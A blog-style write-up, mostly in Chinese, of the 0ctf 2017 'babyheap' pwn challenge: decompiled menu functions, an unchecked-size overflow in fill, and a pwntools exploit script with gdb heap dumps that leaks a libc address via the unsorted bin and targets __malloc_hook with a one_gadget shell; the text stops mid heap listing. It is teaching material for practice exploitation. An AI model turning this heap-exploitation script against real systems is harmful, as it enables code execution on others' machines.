---
layout: post
title:  babyheap
date:   2021-05-26 00:01:01 +0300
image:  2021-05-26-couple.jpg
tags:   [ctf,Pwn,0ctf,ubuntu16,heap,unsorted bin,overlap]
---

main

```assembly
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  __int64 v4; // [rsp+8h] [rbp-8h]

  v4 = sub_B70(a1, a2, a3);
  while ( 1 )
  {
    menu();
    sub_138C();
    switch ( (unsigned __int64)off_14F4 )
    {
      case 1uLL:
        allocate(v4);
        break;
      case 2uLL:
        fill(v4);
        break;
      case 3uLL:
        free_(v4);
        break;
      case 4uLL:
        dump(v4);
        break;
      case 5uLL:
        return 0LL;
      default:
        continue;
    }
  }
}
```

allocate

```assembly
void __fastcall allocate(__int64 a1)
{
  signed int i; // [rsp+10h] [rbp-10h]
  signed int v2; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !*(_DWORD *)(24LL * i + a1) )
    {
      printf("Size: ");
      v2 = sub_138C();
      if ( v2 > 0 )
      {
        if ( v2 > 4096 )
          v2 = 4096;
        v3 = calloc(v2, 1uLL);
        if ( !v3 )
          exit(-1);
        *(_DWORD *)(24LL * i + a1) = 1;
        *(_QWORD *)(a1 + 24LL * i + 8) = v2;
        *(_QWORD *)(a1 + 24LL * i + 16) = v3;
        printf("Allocate Index %d\n", (unsigned int)i);
      }
      return;
    }
  }
}
```

fill

```assembly
__int64 __fastcall fill(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int size; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = sub_138C();
  v2 = result;
  if ( (signed int)result >= 0 && (signed int)result <= 15 )
  {
    result = *(unsigned int *)(24LL * (signed int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      printf("Size: ");
      result = sub_138C();
      size = result;
      if ( (signed int)result > 0 )
      {
        printf("Content: ");
        result = sub_11B2(*(_QWORD *)(24LL * v2 + a1 + 16), size);
      }
    }
  }
  return result;
}
```

为申请的块填充内容，这里未对size进行检查，所以可以利用这个漏洞来overlap修改下一个块的size，从而使其被free后可以放入unsorted bin，进而泄露unsorted bin的地址。

free_

```assembly
__int64 __fastcall free_(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = sub_138C();
  v2 = result;
  if ( (signed int)result >= 0 && (signed int)result <= 15 )
  {
    result = *(unsigned int *)(24LL * (signed int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      *(_DWORD *)(24LL * v2 + a1) = 0;
      *(_QWORD *)(24LL * v2 + a1 + 8) = 0LL;
      free(*(void **)(24LL * v2 + a1 + 16));
      result = 24LL * v2 + a1;
      *(_QWORD *)(result + 16) = 0LL;
    }
  }
  return result;
}
```

free掉块后，指针置为零，这里不存在漏洞。

dump

```assembly
signed int __fastcall dump(__int64 a1)
{
  signed int result; // eax
  signed int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = sub_138C();
  v2 = result;
  if ( result >= 0 && result <= 15 )
  {
    result = *(_DWORD *)(24LL * result + a1);
    if ( result == 1 )
    {
      puts("Content: ");
      sub_130F(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8));
      result = puts(byte_14F1);
    }
  }
  return result;
}
```

输出块中的内容，可以利用它输出unsorted bin的地址。

```assembly
#-*-coding:utf-8-*-
from pwn import *
from LibcSearcher import *

# io = process("./0ctf_2017_babyheap")
io = remote("node3.buuoj.cn", 29224)

def allocate(size):
    io.recvuntil("Command: ")
    io.sendline(str(1))
    io.recvuntil("Size: ")
    io.sendline(str(size))

def fill(index, size, content):
    io.recvuntil("Command: ")
    io.sendline(str(2))
    io.recvuntil("Index: ")
    io.sendline(str(index))
    io.recvuntil("Size: ")
    io.sendline(str(size))
    io.recvuntil("Content: ")
    io.sendline(content)

def free_(index):
    io.recvuntil("Command: ")
    io.sendline(str(3))
    io.recvuntil("Index: ")
    io.sendline(str(index))

def dump(index):
    io.recvuntil("Command: ")
    io.sendline(str(4))
    io.recvuntil("Index: ")
    io.sendline(str(index))

allocate(0x100)
allocate(0x100)
allocate(0x80)
allocate(0x60)
allocate(0x60)
allocate(0x60)
'''
gdb-peda$ x/400gx 0x000055e173f46000
0x55e173f46000:	0x0000000000000000	0x0000000000000111 0
0x55e173f46010:	0x0000000000000000	0x0000000000000000
0x55e173f46020:	0x0000000000000000	0x0000000000000000
0x55e173f46030:	0x0000000000000000	0x0000000000000000
0x55e173f46040:	0x0000000000000000	0x0000000000000000
0x55e173f46050:	0x0000000000000000	0x0000000000000000
0x55e173f46060:	0x0000000000000000	0x0000000000000000
0x55e173f46070:	0x0000000000000000	0x0000000000000000
0x55e173f46080:	0x0000000000000000	0x0000000000000000
0x55e173f46090:	0x0000000000000000	0x0000000000000000
0x55e173f460a0:	0x0000000000000000	0x0000000000000000
0x55e173f460b0:	0x0000000000000000	0x0000000000000000
0x55e173f460c0:	0x0000000000000000	0x0000000000000000
0x55e173f460d0:	0x0000000000000000	0x0000000000000000
0x55e173f460e0:	0x0000000000000000	0x0000000000000000
0x55e173f460f0:	0x0000000000000000	0x0000000000000000
0x55e173f46100:	0x0000000000000000	0x0000000000000000
0x55e173f46110:	0x0000000000000000	0x0000000000000111 1
0x55e173f46120:	0x0000000000000000	0x0000000000000000
0x55e173f46130:	0x0000000000000000	0x0000000000000000
0x55e173f46140:	0x0000000000000000	0x0000000000000000
0x55e173f46150:	0x0000000000000000	0x0000000000000000
0x55e173f46160:	0x0000000000000000	0x0000000000000000
0x55e173f46170:	0x0000000000000000	0x0000000000000000
0x55e173f46180:	0x0000000000000000	0x0000000000000000
0x55e173f46190:	0x0000000000000000	0x0000000000000000
0x55e173f461a0:	0x0000000000000000	0x0000000000000000
0x55e173f461b0:	0x0000000000000000	0x0000000000000000
0x55e173f461c0:	0x0000000000000000	0x0000000000000000
0x55e173f461d0:	0x0000000000000000	0x0000000000000000
0x55e173f461e0:	0x0000000000000000	0x0000000000000000
0x55e173f461f0:	0x0000000000000000	0x0000000000000000
0x55e173f46200:	0x0000000000000000	0x0000000000000000
0x55e173f46210:	0x0000000000000000	0x0000000000000000
0x55e173f46220:	0x0000000000000000	0x0000000000000091 2
0x55e173f46230:	0x0000000000000000	0x0000000000000000
0x55e173f46240:	0x0000000000000000	0x0000000000000000
0x55e173f46250:	0x0000000000000000	0x0000000000000000
0x55e173f46260:	0x0000000000000000	0x0000000000000000
0x55e173f46270:	0x0000000000000000	0x0000000000000000
0x55e173f46280:	0x0000000000000000	0x0000000000000000
0x55e173f46290:	0x0000000000000000	0x0000000000000000
0x55e173f462a0:	0x0000000000000000	0x0000000000000000
0x55e173f462b0:	0x0000000000000000	0x0000000000000071 3
0x55e173f462c0:	0x0000000000000000	0x0000000000000000
0x55e173f462d0:	0x0000000000000000	0x0000000000000000
0x55e173f462e0:	0x0000000000000000	0x0000000000000000
0x55e173f462f0:	0x0000000000000000	0x0000000000000000
0x55e173f46300:	0x0000000000000000	0x0000000000000000
0x55e173f46310:	0x0000000000000000	0x0000000000000000
0x55e173f46320:	0x0000000000000000	0x0000000000000071 4
0x55e173f46330:	0x0000000000000000	0x0000000000000000
0x55e173f46340:	0x0000000000000000	0x0000000000000000
0x55e173f46350:	0x0000000000000000	0x0000000000000000
0x55e173f46360:	0x0000000000000000	0x0000000000000000
0x55e173f46370:	0x0000000000000000	0x0000000000000000
0x55e173f46380:	0x0000000000000000	0x0000000000000000
0x55e173f46390:	0x0000000000000000	0x0000000000000071 5
0x55e173f463a0:	0x0000000000000000	0x0000000000000000
0x55e173f463b0:	0x0000000000000000	0x0000000000000000
0x55e173f463c0:	0x0000000000000000	0x0000000000000000
0x55e173f463d0:	0x0000000000000000	0x0000000000000000
0x55e173f463e0:	0x0000000000000000	0x0000000000000000
0x55e173f463f0:	0x0000000000000000	0x0000000000000000
0x55e173f46400:	0x0000000000000000	0x0000000000020c01
'''

fill(0, 0x110, "a"*0x108+p64(0x1a1))
'''
gdb-peda$ x/400gx 0x000056269b651000
0x56269b651000:	0x0000000000000000	0x0000000000000111 0
0x56269b651010:	0x6161616161616161	0x6161616161616161
0x56269b651020:	0x6161616161616161	0x6161616161616161
0x56269b651030:	0x6161616161616161	0x6161616161616161
0x56269b651040:	0x6161616161616161	0x6161616161616161
0x56269b651050:	0x6161616161616161	0x6161616161616161
0x56269b651060:	0x6161616161616161	0x6161616161616161
0x56269b651070:	0x6161616161616161	0x6161616161616161
0x56269b651080:	0x6161616161616161	0x6161616161616161
0x56269b651090:	0x6161616161616161	0x6161616161616161
0x56269b6510a0:	0x6161616161616161	0x6161616161616161
0x56269b6510b0:	0x6161616161616161	0x6161616161616161
0x56269b6510c0:	0x6161616161616161	0x6161616161616161
0x56269b6510d0:	0x6161616161616161	0x6161616161616161
0x56269b6510e0:	0x6161616161616161	0x6161616161616161
0x56269b6510f0:	0x6161616161616161	0x6161616161616161
0x56269b651100:	0x6161616161616161	0x6161616161616161
0x56269b651110:	0x6161616161616161	0x00000000000001a1 1
0x56269b651120:	0x0000000000000000	0x0000000000000000
0x56269b651130:	0x0000000000000000	0x0000000000000000
0x56269b651140:	0x0000000000000000	0x0000000000000000
0x56269b651150:	0x0000000000000000	0x0000000000000000
0x56269b651160:	0x0000000000000000	0x0000000000000000
0x56269b651170:	0x0000000000000000	0x0000000000000000
0x56269b651180:	0x0000000000000000	0x0000000000000000
0x56269b651190:	0x0000000000000000	0x0000000000000000
0x56269b6511a0:	0x0000000000000000	0x0000000000000000
0x56269b6511b0:	0x0000000000000000	0x0000000000000000
0x56269b6511c0:	0x0000000000000000	0x0000000000000000
0x56269b6511d0:	0x0000000000000000	0x0000000000000000
0x56269b6511e0:	0x0000000000000000	0x0000000000000000
0x56269b6511f0:	0x0000000000000000	0x0000000000000000
0x56269b651200:	0x0000000000000000	0x0000000000000000
0x56269b651210:	0x0000000000000000	0x0000000000000000
0x56269b651220:	0x0000000000000000	0x0000000000000091 2
0x56269b651230:	0x0000000000000000	0x0000000000000000
0x56269b651240:	0x0000000000000000	0x0000000000000000
0x56269b651250:	0x0000000000000000	0x0000000000000000
0x56269b651260:	0x0000000000000000	0x0000000000000000
0x56269b651270:	0x0000000000000000	0x0000000000000000
0x56269b651280:	0x0000000000000000	0x0000000000000000
0x56269b651290:	0x0000000000000000	0x0000000000000000
0x56269b6512a0:	0x0000000000000000	0x0000000000000000
0x56269b6512b0:	0x0000000000000000	0x0000000000000071 3
0x56269b6512c0:	0x0000000000000000	0x0000000000000000
0x56269b6512d0:	0x0000000000000000	0x0000000000000000
0x56269b6512e0:	0x0000000000000000	0x0000000000000000
0x56269b6512f0:	0x0000000000000000	0x0000000000000000
0x56269b651300:	0x0000000000000000	0x0000000000000000
0x56269b651310:	0x0000000000000000	0x0000000000000000
0x56269b651320:	0x0000000000000000	0x0000000000000071 4
0x56269b651330:	0x0000000000000000	0x0000000000000000
0x56269b651340:	0x0000000000000000	0x0000000000000000
0x56269b651350:	0x0000000000000000	0x0000000000000000
0x56269b651360:	0x0000000000000000	0x0000000000000000
0x56269b651370:	0x0000000000000000	0x0000000000000000
0x56269b651380:	0x0000000000000000	0x0000000000000000
0x56269b651390:	0x0000000000000000	0x0000000000000071 5
0x56269b6513a0:	0x0000000000000000	0x0000000000000000
0x56269b6513b0:	0x0000000000000000	0x0000000000000000
0x56269b6513c0:	0x0000000000000000	0x0000000000000000
0x56269b6513d0:	0x0000000000000000	0x0000000000000000
0x56269b6513e0:	0x0000000000000000	0x0000000000000000
0x56269b6513f0:	0x0000000000000000	0x0000000000000000
0x56269b651400:	0x0000000000000000	0x0000000000020c01
'''

free_(1)
'''
gdb-peda$ x/400gx 0x0000561d62bbf000
0x561d62bbf000:	0x0000000000000000	0x0000000000000111 0
0x561d62bbf010:	0x6161616161616161	0x6161616161616161
0x561d62bbf020:	0x6161616161616161	0x6161616161616161
0x561d62bbf030:	0x6161616161616161	0x6161616161616161
0x561d62bbf040:	0x6161616161616161	0x6161616161616161
0x561d62bbf050:	0x6161616161616161	0x6161616161616161
0x561d62bbf060:	0x6161616161616161	0x6161616161616161
0x561d62bbf070:	0x6161616161616161	0x6161616161616161
0x561d62bbf080:	0x6161616161616161	0x6161616161616161
0x561d62bbf090:	0x6161616161616161	0x6161616161616161
0x561d62bbf0a0:	0x6161616161616161	0x6161616161616161
0x561d62bbf0b0:	0x6161616161616161	0x6161616161616161
0x561d62bbf0c0:	0x6161616161616161	0x6161616161616161
0x561d62bbf0d0:	0x6161616161616161	0x6161616161616161
0x561d62bbf0e0:	0x6161616161616161	0x6161616161616161
0x561d62bbf0f0:	0x6161616161616161	0x6161616161616161
0x561d62bbf100:	0x6161616161616161	0x6161616161616161
0x561d62bbf110:	0x6161616161616161	0x00000000000001a1 1
0x561d62bbf120:	0x00007fad79f99b78	0x00007fad79f99b78
0x561d62bbf130:	0x0000000000000000	0x0000000000000000
0x561d62bbf140:	0x0000000000000000	0x0000000000000000
0x561d62bbf150:	0x0000000000000000	0x0000000000000000
0x561d62bbf160:	0x0000000000000000	0x0000000000000000
0x561d62bbf170:	0x0000000000000000	0x0000000000000000
0x561d62bbf180:	0x0000000000000000	0x0000000000000000
0x561d62bbf190:	0x0000000000000000	0x0000000000000000
0x561d62bbf1a0:	0x0000000000000000	0x0000000000000000
0x561d62bbf1b0:	0x0000000000000000	0x0000000000000000
0x561d62bbf1c0:	0x0000000000000000	0x0000000000000000
0x561d62bbf1d0:	0x0000000000000000	0x0000000000000000
0x561d62bbf1e0:	0x0000000000000000	0x0000000000000000
0x561d62bbf1f0:	0x0000000000000000	0x0000000000000000
0x561d62bbf200:	0x0000000000000000	0x0000000000000000
0x561d62bbf210:	0x0000000000000000	0x0000000000000000
0x561d62bbf220:	0x0000000000000000	0x0000000000000091 2
0x561d62bbf230:	0x0000000000000000	0x0000000000000000
0x561d62bbf240:	0x0000000000000000	0x0000000000000000
0x561d62bbf250:	0x0000000000000000	0x0000000000000000
0x561d62bbf260:	0x0000000000000000	0x0000000000000000
0x561d62bbf270:	0x0000000000000000	0x0000000000000000
0x561d62bbf280:	0x0000000000000000	0x0000000000000000
0x561d62bbf290:	0x0000000000000000	0x0000000000000000
0x561d62bbf2a0:	0x0000000000000000	0x0000000000000000
0x561d62bbf2b0:	0x00000000000001a0	0x0000000000000070 3
0x561d62bbf2c0:	0x0000000000000000	0x0000000000000000
0x561d62bbf2d0:	0x0000000000000000	0x0000000000000000
0x561d62bbf2e0:	0x0000000000000000	0x0000000000000000
0x561d62bbf2f0:	0x0000000000000000	0x0000000000000000
0x561d62bbf300:	0x0000000000000000	0x0000000000000000
0x561d62bbf310:	0x0000000000000000	0x0000000000000000
0x561d62bbf320:	0x0000000000000000	0x0000000000000071 4
0x561d62bbf330:	0x0000000000000000	0x0000000000000000
0x561d62bbf340:	0x0000000000000000	0x0000000000000000
0x561d62bbf350:	0x0000000000000000	0x0000000000000000
0x561d62bbf360:	0x0000000000000000	0x0000000000000000
0x561d62bbf370:	0x0000000000000000	0x0000000000000000
0x561d62bbf380:	0x0000000000000000	0x0000000000000000
0x561d62bbf390:	0x0000000000000000	0x0000000000000071 5
0x561d62bbf3a0:	0x0000000000000000	0x0000000000000000
0x561d62bbf3b0:	0x0000000000000000	0x0000000000000000
0x561d62bbf3c0:	0x0000000000000000	0x0000000000000000
0x561d62bbf3d0:	0x0000000000000000	0x0000000000000000
0x561d62bbf3e0:	0x0000000000000000	0x0000000000000000
0x561d62bbf3f0:	0x0000000000000000	0x0000000000000000
0x561d62bbf400:	0x0000000000000000	0x0000000000020c01
'''

allocate(0x190)
'''
gdb-peda$ x/400gx 0x000055ac071e0000
0x55ac071e0000:	0x0000000000000000	0x0000000000000111 0
0x55ac071e0010:	0x6161616161616161	0x6161616161616161
0x55ac071e0020:	0x6161616161616161	0x6161616161616161
0x55ac071e0030:	0x6161616161616161	0x6161616161616161
0x55ac071e0040:	0x6161616161616161	0x6161616161616161
0x55ac071e0050:	0x6161616161616161	0x6161616161616161
0x55ac071e0060:	0x6161616161616161	0x6161616161616161
0x55ac071e0070:	0x6161616161616161	0x6161616161616161
0x55ac071e0080:	0x6161616161616161	0x6161616161616161
0x55ac071e0090:	0x6161616161616161	0x6161616161616161
0x55ac071e00a0:	0x6161616161616161	0x6161616161616161
0x55ac071e00b0:	0x6161616161616161	0x6161616161616161
0x55ac071e00c0:	0x6161616161616161	0x6161616161616161
0x55ac071e00d0:	0x6161616161616161	0x6161616161616161
0x55ac071e00e0:	0x6161616161616161	0x6161616161616161
0x55ac071e00f0:	0x6161616161616161	0x6161616161616161
0x55ac071e0100:	0x6161616161616161	0x6161616161616161
0x55ac071e0110:	0x6161616161616161	0x00000000000001a1 1
0x55ac071e0120:	0x0000000000000000	0x0000000000000000
0x55ac071e0130:	0x0000000000000000	0x0000000000000000
0x55ac071e0140:	0x0000000000000000	0x0000000000000000
0x55ac071e0150:	0x0000000000000000	0x0000000000000000
0x55ac071e0160:	0x0000000000000000	0x0000000000000000
0x55ac071e0170:	0x0000000000000000	0x0000000000000000
0x55ac071e0180:	0x0000000000000000	0x0000000000000000
0x55ac071e0190:	0x0000000000000000	0x0000000000000000
0x55ac071e01a0:	0x0000000000000000	0x0000000000000000
0x55ac071e01b0:	0x0000000000000000	0x0000000000000000
0x55ac071e01c0:	0x0000000000000000	0x0000000000000000
0x55ac071e01d0:	0x0000000000000000	0x0000000000000000
0x55ac071e01e0:	0x0000000000000000	0x0000000000000000
0x55ac071e01f0:	0x0000000000000000	0x0000000000000000
0x55ac071e0200:	0x0000000000000000	0x0000000000000000
0x55ac071e0210:	0x0000000000000000	0x0000000000000000
0x55ac071e0220:	0x0000000000000000	0x0000000000000000
0x55ac071e0230:	0x0000000000000000	0x0000000000000000
0x55ac071e0240:	0x0000000000000000	0x0000000000000000
0x55ac071e0250:	0x0000000000000000	0x0000000000000000
0x55ac071e0260:	0x0000000000000000	0x0000000000000000
0x55ac071e0270:	0x0000000000000000	0x0000000000000000
0x55ac071e0280:	0x0000000000000000	0x0000000000000000
0x55ac071e0290:	0x0000000000000000	0x0000000000000000
0x55ac071e02a0:	0x0000000000000000	0x0000000000000000
0x55ac071e02b0:	0x0000000000000000	0x0000000000000071 3 
0x55ac071e02c0:	0x0000000000000000	0x0000000000000000
0x55ac071e02d0:	0x0000000000000000	0x0000000000000000
0x55ac071e02e0:	0x0000000000000000	0x0000000000000000
0x55ac071e02f0:	0x0000000000000000	0x0000000000000000
0x55ac071e0300:	0x0000000000000000	0x0000000000000000
0x55ac071e0310:	0x0000000000000000	0x0000000000000000
0x55ac071e0320:	0x0000000000000000	0x0000000000000071 4
0x55ac071e0330:	0x0000000000000000	0x0000000000000000
0x55ac071e0340:	0x0000000000000000	0x0000000000000000
0x55ac071e0350:	0x0000000000000000	0x0000000000000000
0x55ac071e0360:	0x0000000000000000	0x0000000000000000
0x55ac071e0370:	0x0000000000000000	0x0000000000000000
0x55ac071e0380:	0x0000000000000000	0x0000000000000000
0x55ac071e0390:	0x0000000000000000	0x0000000000000071 5
0x55ac071e03a0:	0x0000000000000000	0x0000000000000000
0x55ac071e03b0:	0x0000000000000000	0x0000000000000000
0x55ac071e03c0:	0x0000000000000000	0x0000000000000000
0x55ac071e03d0:	0x0000000000000000	0x0000000000000000
0x55ac071e03e0:	0x0000000000000000	0x0000000000000000
0x55ac071e03f0:	0x0000000000000000	0x0000000000000000
0x55ac071e0400:	0x0000000000000000	0x0000000000020c01
'''

fill(1, 0x110, "b"*0x108 + p64(0x91))
'''
gdb-peda$ x/400gx 0x0000561b9e4b6000
0x561b9e4b6000:	0x0000000000000000	0x0000000000000111 0
0x561b9e4b6010:	0x6161616161616161	0x6161616161616161
0x561b9e4b6020:	0x6161616161616161	0x6161616161616161
0x561b9e4b6030:	0x6161616161616161	0x6161616161616161
0x561b9e4b6040:	0x6161616161616161	0x6161616161616161
0x561b9e4b6050:	0x6161616161616161	0x6161616161616161
0x561b9e4b6060:	0x6161616161616161	0x6161616161616161
0x561b9e4b6070:	0x6161616161616161	0x6161616161616161
0x561b9e4b6080:	0x6161616161616161	0x6161616161616161
0x561b9e4b6090:	0x6161616161616161	0x6161616161616161
0x561b9e4b60a0:	0x6161616161616161	0x6161616161616161
0x561b9e4b60b0:	0x6161616161616161	0x6161616161616161
0x561b9e4b60c0:	0x6161616161616161	0x6161616161616161
0x561b9e4b60d0:	0x6161616161616161	0x6161616161616161
0x561b9e4b60e0:	0x6161616161616161	0x6161616161616161
0x561b9e4b60f0:	0x6161616161616161	0x6161616161616161
0x561b9e4b6100:	0x6161616161616161	0x6161616161616161
0x561b9e4b6110:	0x6161616161616161	0x00000000000001a1 1
0x561b9e4b6120:	0x6262626262626262	0x6262626262626262
0x561b9e4b6130:	0x6262626262626262	0x6262626262626262
0x561b9e4b6140:	0x6262626262626262	0x6262626262626262
0x561b9e4b6150:	0x6262626262626262	0x6262626262626262
0x561b9e4b6160:	0x6262626262626262	0x6262626262626262
0x561b9e4b6170:	0x6262626262626262	0x6262626262626262
0x561b9e4b6180:	0x6262626262626262	0x6262626262626262
0x561b9e4b6190:	0x6262626262626262	0x6262626262626262
0x561b9e4b61a0:	0x6262626262626262	0x6262626262626262
0x561b9e4b61b0:	0x6262626262626262	0x6262626262626262
0x561b9e4b61c0:	0x6262626262626262	0x6262626262626262
0x561b9e4b61d0:	0x6262626262626262	0x6262626262626262
0x561b9e4b61e0:	0x6262626262626262	0x6262626262626262
0x561b9e4b61f0:	0x6262626262626262	0x6262626262626262
0x561b9e4b6200:	0x6262626262626262	0x6262626262626262
0x561b9e4b6210:	0x6262626262626262	0x6262626262626262
0x561b9e4b6220:	0x6262626262626262	0x0000000000000091 2
0x561b9e4b6230:	0x0000000000000000	0x0000000000000000
0x561b9e4b6240:	0x0000000000000000	0x0000000000000000
0x561b9e4b6250:	0x0000000000000000	0x0000000000000000
0x561b9e4b6260:	0x0000000000000000	0x0000000000000000
0x561b9e4b6270:	0x0000000000000000	0x0000000000000000
0x561b9e4b6280:	0x0000000000000000	0x0000000000000000
0x561b9e4b6290:	0x0000000000000000	0x0000000000000000
0x561b9e4b62a0:	0x0000000000000000	0x0000000000000000
0x561b9e4b62b0:	0x0000000000000000	0x0000000000000071 3
0x561b9e4b62c0:	0x0000000000000000	0x0000000000000000
0x561b9e4b62d0:	0x0000000000000000	0x0000000000000000
0x561b9e4b62e0:	0x0000000000000000	0x0000000000000000
0x561b9e4b62f0:	0x0000000000000000	0x0000000000000000
0x561b9e4b6300:	0x0000000000000000	0x0000000000000000
0x561b9e4b6310:	0x0000000000000000	0x0000000000000000
0x561b9e4b6320:	0x0000000000000000	0x0000000000000071 4
0x561b9e4b6330:	0x0000000000000000	0x0000000000000000
0x561b9e4b6340:	0x0000000000000000	0x0000000000000000
0x561b9e4b6350:	0x0000000000000000	0x0000000000000000
0x561b9e4b6360:	0x0000000000000000	0x0000000000000000
0x561b9e4b6370:	0x0000000000000000	0x0000000000000000
0x561b9e4b6380:	0x0000000000000000	0x0000000000000000
0x561b9e4b6390:	0x0000000000000000	0x0000000000000071 5
0x561b9e4b63a0:	0x0000000000000000	0x0000000000000000
0x561b9e4b63b0:	0x0000000000000000	0x0000000000000000
0x561b9e4b63c0:	0x0000000000000000	0x0000000000000000
0x561b9e4b63d0:	0x0000000000000000	0x0000000000000000
0x561b9e4b63e0:	0x0000000000000000	0x0000000000000000
0x561b9e4b63f0:	0x0000000000000000	0x0000000000000000
0x561b9e4b6400:	0x0000000000000000	0x0000000000020c01
'''

free_(2)
'''
gdb-peda$ x/400gx 0x000055a3f224f000
0x55a3f224f000:	0x0000000000000000	0x0000000000000111 0
0x55a3f224f010:	0x6161616161616161	0x6161616161616161
0x55a3f224f020:	0x6161616161616161	0x6161616161616161
0x55a3f224f030:	0x6161616161616161	0x6161616161616161
0x55a3f224f040:	0x6161616161616161	0x6161616161616161
0x55a3f224f050:	0x6161616161616161	0x6161616161616161
0x55a3f224f060:	0x6161616161616161	0x6161616161616161
0x55a3f224f070:	0x6161616161616161	0x6161616161616161
0x55a3f224f080:	0x6161616161616161	0x6161616161616161
0x55a3f224f090:	0x6161616161616161	0x6161616161616161
0x55a3f224f0a0:	0x6161616161616161	0x6161616161616161
0x55a3f224f0b0:	0x6161616161616161	0x6161616161616161
0x55a3f224f0c0:	0x6161616161616161	0x6161616161616161
0x55a3f224f0d0:	0x6161616161616161	0x6161616161616161
0x55a3f224f0e0:	0x6161616161616161	0x6161616161616161
0x55a3f224f0f0:	0x6161616161616161	0x6161616161616161
0x55a3f224f100:	0x6161616161616161	0x6161616161616161
0x55a3f224f110:	0x6161616161616161	0x00000000000001a1 1
0x55a3f224f120:	0x6262626262626262	0x6262626262626262
0x55a3f224f130:	0x6262626262626262	0x6262626262626262
0x55a3f224f140:	0x6262626262626262	0x6262626262626262
0x55a3f224f150:	0x6262626262626262	0x6262626262626262
0x55a3f224f160:	0x6262626262626262	0x6262626262626262
0x55a3f224f170:	0x6262626262626262	0x6262626262626262
0x55a3f224f180:	0x6262626262626262	0x6262626262626262
0x55a3f224f190:	0x6262626262626262	0x6262626262626262
0x55a3f224f1a0:	0x6262626262626262	0x6262626262626262
0x55a3f224f1b0:	0x6262626262626262	0x6262626262626262
0x55a3f224f1c0:	0x6262626262626262	0x6262626262626262
0x55a3f224f1d0:	0x6262626262626262	0x6262626262626262
0x55a3f224f1e0:	0x6262626262626262	0x6262626262626262
0x55a3f224f1f0:	0x6262626262626262	0x6262626262626262
0x55a3f224f200:	0x6262626262626262	0x6262626262626262
0x55a3f224f210:	0x6262626262626262	0x6262626262626262
0x55a3f224f220:	0x6262626262626262	0x0000000000000091 2
0x55a3f224f230:	0x00007f2e8da91b78	0x00007f2e8da91b78
0x55a3f224f240:	0x0000000000000000	0x0000000000000000
0x55a3f224f250:	0x0000000000000000	0x0000000000000000
0x55a3f224f260:	0x0000000000000000	0x0000000000000000
0x55a3f224f270:	0x0000000000000000	0x0000000000000000
0x55a3f224f280:	0x0000000000000000	0x0000000000000000
0x55a3f224f290:	0x0000000000000000	0x0000000000000000
0x55a3f224f2a0:	0x0000000000000000	0x0000000000000000
0x55a3f224f2b0:	0x0000000000000090	0x0000000000000070 3
0x55a3f224f2c0:	0x0000000000000000	0x0000000000000000
0x55a3f224f2d0:	0x0000000000000000	0x0000000000000000
0x55a3f224f2e0:	0x0000000000000000	0x0000000000000000
0x55a3f224f2f0:	0x0000000000000000	0x0000000000000000
0x55a3f224f300:	0x0000000000000000	0x0000000000000000
0x55a3f224f310:	0x0000000000000000	0x0000000000000000
0x55a3f224f320:	0x0000000000000000	0x0000000000000071 4
0x55a3f224f330:	0x0000000000000000	0x0000000000000000
0x55a3f224f340:	0x0000000000000000	0x0000000000000000
0x55a3f224f350:	0x0000000000000000	0x0000000000000000
0x55a3f224f360:	0x0000000000000000	0x0000000000000000
0x55a3f224f370:	0x0000000000000000	0x0000000000000000
0x55a3f224f380:	0x0000000000000000	0x0000000000000000
0x55a3f224f390:	0x0000000000000000	0x0000000000000071 5
0x55a3f224f3a0:	0x0000000000000000	0x0000000000000000
0x55a3f224f3b0:	0x0000000000000000	0x0000000000000000
0x55a3f224f3c0:	0x0000000000000000	0x0000000000000000
0x55a3f224f3d0:	0x0000000000000000	0x0000000000000000
0x55a3f224f3e0:	0x0000000000000000	0x0000000000000000
0x55a3f224f3f0:	0x0000000000000000	0x0000000000000000
0x55a3f224f400:	0x0000000000000000	0x0000000000020c01
'''
'''
gdb-peda$ x/20gx 0x00007ff533e07b78
0x7ff533e07b78 <main_arena+88>:	0x0000559110124400	0x0000000000000000
0x7ff533e07b88 <main_arena+104>:	0x0000559110124220	0x0000559110124220
0x7ff533e07b98 <main_arena+120>:	0x00007ff533e07b88	0x00007ff533e07b88
'''

dump(1)
io.recvline()
io.recv(0x118)
# unsorted_bin = u64(io.recvuntil("\n")[:-1].ljust(8, "\x00"))
unsorted_bin = u64(io.recv(8))
print(hex(unsorted_bin))

'''
[+]libc version : glibc 2.23
[+]build ID : BuildID[sha1]=1ca54a6e0d76188105b12e49fe6b8019bf08803a
[+]main_arena_offset : 0x3c4b20
'''
main_arena = unsorted_bin - 88
base = main_arena - 0x3c4b20

'''
gdb-peda$ x/20gx 0x00007ff533e07b78-88-0x20
0x7ff533e07b00 <__memalign_hook>:	0x00007ff533ac8ea0	0x00007ff533ac8a70
0x7ff533e07b10 <__malloc_hook>:	0x0000000000000000	0x0000000000000000
0x7ff533e07b20 <main_arena>:	0x0000000100000000	0x0000000000000000
0x7ff533e07b30 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ff533e07b40 <main_arena+32>:	0x0000000000000000	0x0000000000000000
'''
malloc_hook = main_arena - 0x10
'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
one_gadget = base + 0x4526a

free_(4)
'''
gdb-peda$ heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x55aa92ce1320 --> 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
